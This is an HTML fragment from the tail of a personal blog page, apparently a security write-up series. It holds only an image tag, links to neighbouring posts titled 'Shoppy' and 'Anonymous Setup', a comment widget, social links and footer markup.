+<img src="/2022/09/22/support/20220922171619.png" class=""></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2022/09/23/shoppy/" title="Shoppy"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Shoppy</span></a><a class="button is-default" href="/2022/07/29/anonymous-setup/" title="Anonymous Setup"><span class="has-text-weight-semibold">Next: Anonymous Setup</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/ischyrós"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Furnicarul"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Copyright © &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="IulianSiPunct" target="_blank" rel="noopener" href="//github.com/Furnicarul">ischyrós&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/Furnicarul" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
